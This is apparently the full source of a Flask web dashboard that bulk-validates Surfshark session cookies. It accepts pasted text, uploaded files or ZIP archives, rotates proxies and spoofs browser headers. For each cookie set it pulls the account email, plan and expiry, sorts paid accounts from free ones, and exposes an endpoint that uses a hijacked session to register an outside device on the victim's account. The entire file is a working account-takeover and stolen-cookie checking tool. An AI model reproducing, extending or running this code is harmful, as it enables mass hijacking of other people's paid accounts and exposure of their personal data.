# ─────────────────────────────────────────────────────────────────────────────
#  Surfshark Validator — Web Edition
#  Fast API validation (no Playwright) | Web layer by Trex
# ─────────────────────────────────────────────────────────────────────────────

from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
import threading
import datetime
import io
import os
import re
import json
import random
import zipfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any

import requests
from requests.cookies import RequestsCookieJar
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

urllib3.disable_warnings()

# ─── App Setup ────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "surfshark-validator-secret-2026")
app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

BATCH: Dict[str, Any] = {"running": False}

# ─── Constants ────────────────────────────────────────────────────────────────
# Auth is cookie-only. A preflight page GET exchanges the _ssrtk refresh token
# for a fresh access session (Set-Cookie); then the JSON APIs return data.
PREFLIGHT_URL = "https://my.surfshark.com/account"
ORDERS_URL    = "https://my.surfshark.com/account/p_api/v1/payment/orders"
PROFILE_URL   = "https://my.surfshark.com/account/p_api/v1/identity/altid/profile"
ASSIGN_URL    = "https://my.surfshark.com/account/p_api/v1/account/authorization/assign"
TIMEOUT       = (10, 25)

SESSION_KEYS = {"_ssli", "_ssrtk"}

BASE_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",   # no br/zstd (decode issue)
    "Referer": "https://my.surfshark.com/account/subscription/products",
    "x-requested-with": "XMLHttpRequest",
    "Connection": "keep-alive",
}
PAGE_HEADERS = {**BASE_HEADERS,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate"}

# Field key -> label for exported .txt files (every toggle maps to a real key).
EXPORT_FIELD_LABELS: List[Tuple[str, str]] = [
    ("email",       "Email"),
    ("product",     "Product"),
    ("sub_status",  "Status"),
    ("expires",     "Expires"),
    ("recurring",   "Recurring"),
    ("frequency",   "Frequency"),
    ("date",        "Date"),
    ("source_file", "Source File"),
    ("status",      "Validation"),
    ("reason",      "Reason"),
]

# ─── Result Model ─────────────────────────────────────────────────────────────

@dataclass
class ValidationResult:
    source_file: str
    status:      str               # valid | invalid | error | duplicate
    reason:      str = ""
    email:       Optional[str] = None
    product:     Optional[str] = None
    sub_status:  Optional[str] = None
    expires:     Optional[str] = None
    recurring:   Optional[bool] = None
    frequency:   Optional[str] = None
    is_paid:     bool = False
    cookie_text: str = ""

    def _plan_folder(self) -> str:
        if not self.is_paid:
            return "free"
        return normalize_plan(self.product)

    def to_dict(self) -> dict:
        return {
            "source_file": self.source_file,
            "status":      self.status,
            "reason":      self.reason or "",
            "email":       self.email or "",
            "product":     self.product or "",
            "sub_status":  self.sub_status or "",
            "expires":     self.expires or "",
            "recurring":   ("Yes" if self.recurring else "No") if self.recurring is not None else "",
            "frequency":   self.frequency or "",
            "is_paid":     self.is_paid,
            "date":        datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "folder":      self._plan_folder(),
            "cookie":      self.cookie_text,
        }

# ─── Cookie Parsing ───────────────────────────────────────────────────────────

def parse_cookies(raw: str) -> Dict[str, str]:
    content = (raw or "").strip()
    if not content:
        return {}
    if content.startswith("["):
        try:
            arr = json.loads(content)
            if isinstance(arr, list):
                ck: Dict[str, str] = {}
                for c in arr:
                    if isinstance(c, dict) and c.get("name"):
                        ck[c["name"]] = str(c.get("value", ""))
                if ck:
                    return ck
        except Exception:
            pass
    ck, is_ns = {}, False
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5]:
            is_ns = True
            ck[parts[5]] = parts[6]
    if is_ns:
        return ck
    if "=" in content:
        hck = {}
        for part in content.replace("\n", ";").split(";"):
            if "=" in part:
                k, _, v = part.strip().partition("=")
                k = k.strip()
                if k:
                    hck[k] = v.strip()
        return hck
    return {}


def is_candidate(cookies: Dict[str, str]) -> bool:
    return bool(cookies) and any(k in cookies for k in SESSION_KEYS)


def cookie_sets_from_text(text: str, filename: str) -> List[Tuple[str, Dict[str, str], str]]:
    cookies = parse_cookies(text)
    if not cookies:
        return []
    return [(filename, cookies, text.strip())]


def cookie_sets_from_zip(data: bytes) -> List[Tuple[str, Dict[str, str], str]]:
    out: List[Tuple[str, Dict[str, str], str]] = []
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                try:
                    with zf.open(info) as f:
                        raw = f.read().decode("utf-8", "ignore")
                except Exception:
                    continue
                cookies = parse_cookies(raw)
                if cookies and is_candidate(cookies):
                    out.append((os.path.basename(info.filename), cookies, raw.strip()))
    except Exception:
        pass
    return out

# ─── Session + Validation ─────────────────────────────────────────────────────

def make_session(cookies: Dict[str, str], proxy: Optional[str]) -> requests.Session:
    s = requests.Session()
    jar = RequestsCookieJar()
    for k, v in cookies.items():
        jar.set(k, v, domain=".surfshark.com", path="/")
        jar.set(k, v, domain="my.surfshark.com", path="/")
    s.cookies = jar
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    s.verify = False
    retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[502, 504])
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


def normalize_plan(plan: Optional[str]) -> str:
    p = (plan or "").strip().lower()
    if not p or p == "free":
        return "free"
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", p).strip("._-")
    return safe[:60] or "free"


def _parse_dt(value) -> Optional[datetime.datetime]:
    if not value:
        return None
    try:
        return datetime.datetime.fromisoformat(str(value).replace("Z", "+00:00"))
    except Exception:
        return None


def _fmt_date(value) -> str:
    dt = _parse_dt(value)
    return dt.strftime("%Y-%m-%d") if dt else (str(value)[:10] if value else "")


def fetch_account(session: requests.Session) -> Tuple[dict, str]:
    """Return (info, status) where status is valid | invalid | error."""
    info = {"logged_in": False, "email": None, "product": None, "status": None,
            "expires": None, "recurring": None, "frequency": None, "is_paid": False}

    # 0) Preflight — refresh access session from the _ssrtk refresh token.
    #    stream=True: we only need the Set-Cookie headers (session refresh), NOT
    #    the heavy account HTML body — so we never download it. This is what kept
    #    timing out under concurrency. A preflight hiccup is non-fatal; the orders
    #    call below is the real authority on valid/invalid/error.
    try:
        pre = session.get(PREFLIGHT_URL, headers=PAGE_HEADERS, timeout=TIMEOUT,
                          allow_redirects=True, stream=True)
        pre.close()
    except requests.RequestException:
        pass

    # 1) Orders — auth check + subscription data.
    try:
        r = session.get(ORDERS_URL, headers=BASE_HEADERS, timeout=TIMEOUT, allow_redirects=False)
    except requests.RequestException as e:
        info["error"] = f"{type(e).__name__}"
        return info, "error"
    if r.status_code in (301, 302, 303, 307, 308, 401, 403):
        return info, "invalid"
    if r.status_code != 200:
        info["error"] = f"HTTP {r.status_code}"
        return info, "invalid"
    try:
        orders = r.json()
    except Exception:
        return info, "invalid"
    if not isinstance(orders, list):
        return info, "invalid"

    info["logged_in"] = True
    now = datetime.datetime.now(datetime.timezone.utc)

    def sub_of(o):
        return o.get("subscription") or {}

    active = []
    for o in orders:
        sub = sub_of(o)
        st = (sub.get("status") or "").lower()
        exp = _parse_dt(sub.get("expiresAt"))
        if st == "active" and exp and exp > now:
            active.append(sub)

    chosen = None
    if active:
        active.sort(key=lambda s: s.get("createdAt") or "", reverse=True)
        chosen = active[0]
        info["is_paid"] = True
        info["status"] = "active"
    elif orders:
        subs = [sub_of(o) for o in orders if sub_of(o)]
        subs.sort(key=lambda s: s.get("createdAt") or "", reverse=True)
        if subs:
            chosen = subs[0]
            info["status"] = chosen.get("status") or "expired"

    if chosen:
        info["product"] = chosen.get("name")
        info["expires"] = _fmt_date(chosen.get("expiresAt"))
        info["recurring"] = bool(chosen.get("recurring"))
        freq, unit = chosen.get("frequency"), chosen.get("frequencyUnit")
        if freq and unit:
            info["frequency"] = f"{freq} {unit}"

    # 2) Profile — best-effort primary email.
    try:
        rp = session.get(PROFILE_URL, headers=BASE_HEADERS, timeout=TIMEOUT, allow_redirects=False)
        if rp.status_code == 200:
            data = rp.json()
            profiles = data if isinstance(data, list) else [data]
            for prof in profiles:
                emails = (prof or {}).get("emails") or []
                primary = next((e for e in emails if e.get("primary")), None) or (emails[0] if emails else None)
                if primary and primary.get("email"):
                    info["email"] = primary["email"]
                    break
    except Exception:
        pass

    return info, "valid"


def validate_one(source_file: str, cookies: Dict[str, str], raw_text: str,
                 proxy: Optional[str], do_preflight: bool) -> ValidationResult:
    if not cookies:
        return ValidationResult(source_file=source_file, status="invalid",
                                reason="No cookies parsed", cookie_text=raw_text)
    if not is_candidate(cookies):
        return ValidationResult(source_file=source_file, status="invalid",
                                reason="No Surfshark session cookie", cookie_text=raw_text)
    try:
        session = make_session(cookies, proxy)
        info, status = fetch_account(session)
    except Exception as e:
        return ValidationResult(source_file=source_file, status="error",
                                reason=str(e)[:120], cookie_text=raw_text)

    if status == "error":
        return ValidationResult(source_file=source_file, status="error",
                                reason=info.get("error") or "Request failed", cookie_text=raw_text)
    if status != "valid" or not info.get("logged_in"):
        return ValidationResult(source_file=source_file, status="invalid",
                                reason="Expired / not logged in", cookie_text=raw_text)

    return ValidationResult(
        source_file=source_file, status="valid", reason="Authenticated",
        email=info.get("email"), product=info.get("product"),
        sub_status=info.get("status"), expires=info.get("expires"),
        recurring=info.get("recurring"), frequency=info.get("frequency"),
        is_paid=bool(info.get("is_paid")), cookie_text=raw_text,
    )


def activate_device(cookies: Dict[str, str], code: str, proxy: Optional[str]) -> dict:
    """Assign/activate a device using a Surfshark login code while authenticated
    via the account cookies. Mirrors the browser: preflight to refresh the access
    session, then POST {"code": CODE} to the authorization/assign endpoint."""
    code = (code or "").strip().upper()
    if not is_candidate(cookies):
        return {"ok": False, "logged_in": False, "message": "No Surfshark session cookie in the pasted cookie"}
    if not re.fullmatch(r"[A-Z0-9]{4,10}", code):
        return {"ok": False, "logged_in": False, "message": "Enter a valid activation code (4-10 letters/numbers)"}
    try:
        session = make_session(cookies, proxy)
        # Preflight: refresh the access session from the _ssrtk refresh token.
        try:
            pre = session.get(PREFLIGHT_URL, headers=PAGE_HEADERS, timeout=TIMEOUT,
                              allow_redirects=True, stream=True)
            pre.close()
        except requests.RequestException:
            pass
        # Best-effort: confirm logged in + grab the email to show in the result.
        email = None
        try:
            rp = session.get(PROFILE_URL, headers=BASE_HEADERS, timeout=TIMEOUT, allow_redirects=False)
            if rp.status_code in (401, 403):
                return {"ok": False, "logged_in": False, "message": "Cookie expired / not logged in"}
            if rp.status_code == 200:
                data = rp.json()
                profiles = data if isinstance(data, list) else [data]
                for prof in profiles:
                    emails = (prof or {}).get("emails") or []
                    primary = next((e for e in emails if e.get("primary")), None) or (emails[0] if emails else None)
                    if primary and primary.get("email"):
                        email = primary["email"]
                        break
        except Exception:
            pass

        headers = {**BASE_HEADERS, "Content-Type": "application/json",
                   "Origin": "https://my.surfshark.com",
                   "Referer": "https://my.surfshark.com/account/login-code"}
        r = session.post(ASSIGN_URL, headers=headers, json={"code": code},
                         timeout=TIMEOUT, allow_redirects=False)
    except requests.RequestException as e:
        return {"ok": False, "logged_in": True, "message": f"Network error: {type(e).__name__}"}
    except Exception as e:
        return {"ok": False, "logged_in": True, "message": str(e)[:160]}

    if r.status_code in (200, 201, 204):
        return {"ok": True, "logged_in": True, "email": email,
                "message": f"Device activated with code {code}" + (f" on {email}" if email else "")}
    if r.status_code in (401, 403):
        return {"ok": False, "logged_in": False, "message": "Cookie expired / not logged in"}

    detail = ""
    try:
        body = r.json()
        if isinstance(body, dict):
            detail = body.get("message") or body.get("error") or body.get("detail") or ""
    except Exception:
        detail = (r.text or "")[:120]
    if r.status_code in (400, 404, 409, 422):
        return {"ok": False, "logged_in": True, "email": email,
                "message": detail or "Invalid or expired activation code"}
    return {"ok": False, "logged_in": True, "email": email,
            "message": detail or f"Activation failed (HTTP {r.status_code})"}


def validate_with_retry(source_file: str, cookies: Dict[str, str], raw_text: str,
                        proxies: List[str], do_preflight: bool,
                        max_attempts: int = 3) -> ValidationResult:
    pool = list(proxies) if proxies else [None]
    random.shuffle(pool)
    attempts = max(1, max_attempts) if (proxies or max_attempts > 1) else 1
    last: Optional[ValidationResult] = None
    for i in range(attempts):
        proxy = pool[i % len(pool)]
        res = validate_one(source_file, cookies, raw_text, proxy, do_preflight)
        if res.status != "error":
            return res
        last = res
    if last is not None:
        base = last.reason or "Request failed"
        last.reason = f"{base} (after {attempts} attempt{'s' if attempts != 1 else ''})"
    return last or ValidationResult(source_file=source_file, status="error",
                                    reason="Request failed", cookie_text=raw_text)

# ─── Proxies ──────────────────────────────────────────────────────────────────

def parse_proxy_line(line: str) -> Optional[str]:
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None
    if "://" in line:
        return line
    parts = line.split(":")
    if len(parts) == 2:
        return f"http://{line}"
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return f"http://{line}"


def parse_proxies(text: str) -> List[str]:
    out = []
    for line in (text or "").splitlines():
        p = parse_proxy_line(line)
        if p:
            out.append(p)
    return out

# ─── Batch Worker (with email deduplication) ──────────────────────────────────

def process_batch(cookie_sets: List[Tuple[str, Dict[str, str], str]],
                  proxies: List[str], num_threads: int, do_preflight: bool,
                  max_attempts: int = 3) -> None:
    total  = len(cookie_sets)
    counts = {"valid": 0, "invalid": 0, "error": 0,
              "duplicate": 0, "paid": 0, "free": 0}
    plans: Dict[str, int] = {}
    seen_emails = set()
    lock  = threading.Lock()
    queue = list(cookie_sets)
    ql    = threading.Lock()
    proc  = [0]

    def worker():
        while True:
            with ql:
                if not queue or not BATCH["running"]:
                    return
                src, cks, raw = queue.pop(0)
            if not BATCH["running"]:
                return

            result = validate_with_retry(src, cks, raw, proxies, do_preflight, max_attempts)

            if not BATCH["running"]:
                return

            with lock:
                proc[0] += 1
                row = result.to_dict()
                row["idx"] = proc[0]

                if result.status == "valid":
                    email = (result.email or "").strip().lower()
                    if email and email in seen_emails:
                        row["status"] = "duplicate"
                        row["dup"]    = True
                        counts["duplicate"] += 1
                    else:
                        if email:
                            seen_emails.add(email)
                        counts["valid"] += 1
                        if result.is_paid:
                            counts["paid"] += 1
                            p = normalize_plan(result.product)
                            plans[p] = plans.get(p, 0) + 1
                        else:
                            counts["free"] += 1
                else:
                    counts[result.status] = counts.get(result.status, 0) + 1

                socketio.emit("result_row", row)
                socketio.emit("counts", {
                    **counts, "plans": plans, "total": total, "processed": proc[0],
                })

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(min(num_threads, total, 50))]
    for t in threads: t.start()
    for t in threads: t.join()

    BATCH["running"] = False
    socketio.emit("batch_done", {
        **counts, "plans": plans, "total": total, "processed": proc[0],
    })

# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template_string(DASHBOARD)


@app.route("/api/check-single", methods=["POST"])
def check_single():
    payload = request.get_json(silent=True) or {}
    raw = (payload.get("cookie") or "").strip()
    proxies_text = payload.get("proxies", "")
    if not raw:
        return jsonify({"error": "No cookie provided"}), 400
    cookies = parse_cookies(raw)
    proxies = parse_proxies(proxies_text) if proxies_text.strip() else []
    retries = int(payload.get("retries", 3) or 3)
    result = validate_with_retry("single", cookies, raw, proxies, True, max(1, retries))
    return jsonify(result.to_dict())


@app.route("/api/activate", methods=["POST"])
def activate():
    payload = request.get_json(silent=True) or {}
    raw = (payload.get("cookie") or "").strip()
    code = (payload.get("code") or "").strip()
    proxies_text = payload.get("proxies", "")
    if not raw:
        return jsonify({"ok": False, "message": "No cookie provided"}), 400
    if not code:
        return jsonify({"ok": False, "message": "No activation code provided"}), 400
    cookies = parse_cookies(raw)
    proxies = parse_proxies(proxies_text) if proxies_text.strip() else []
    proxy = random.choice(proxies) if proxies else None
    result = activate_device(cookies, code, proxy)
    return jsonify(result)


@app.route("/api/batch", methods=["POST"])
def start_batch():
    if BATCH["running"]:
        return jsonify({"error": "A batch is already running"})

    num_threads  = min(max(int(request.form.get("threads", 10)), 1), 50)
    do_preflight = request.form.get("preflight", "true").lower() not in ("false", "0", "no")
    max_attempts = min(max(int(request.form.get("retries", 3) or 3), 1), 8)
    proxies_text = request.form.get("proxies", "")
    proxies      = parse_proxies(proxies_text) if proxies_text.strip() else []

    cookie_sets: List[Tuple[str, Dict[str, str], str]] = []
    for f in request.files.getlist("cookies"):
        fname = f.filename or "file"
        try:
            f.seek(0)
            raw = f.read()
            if fname.lower().endswith(".zip"):
                cookie_sets.extend(cookie_sets_from_zip(raw))
            else:
                cookie_sets.extend(cookie_sets_from_text(raw.decode("utf-8", "replace"), fname))
        except Exception as e:
            app.logger.error("File error %s: %s", fname, e)

    paste = (request.form.get("paste_text", "") or "").strip()
    if paste:
        for i, block in enumerate(re.split(r"\n-{3,}\n", paste)):
            if block.strip():
                cookie_sets.extend(cookie_sets_from_text(block.strip(), f"paste_{i+1}.txt"))

    if not cookie_sets:
        return jsonify({"error": "No valid Surfshark cookie sets found"})

    BATCH["running"] = True
    socketio.start_background_task(process_batch, cookie_sets, proxies, num_threads, do_preflight, max_attempts)
    return jsonify({"started": True, "total": len(cookie_sets)})


@socketio.on("stop_batch")
def on_stop(_data=None):
    BATCH["running"] = False

# ─── Dashboard HTML ───────────────────────────────────────────────────────────

with open(os.path.join(os.path.dirname(__file__), "dashboard.html"), "r", encoding="utf-8") as _f:
    DASHBOARD = _f.read()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
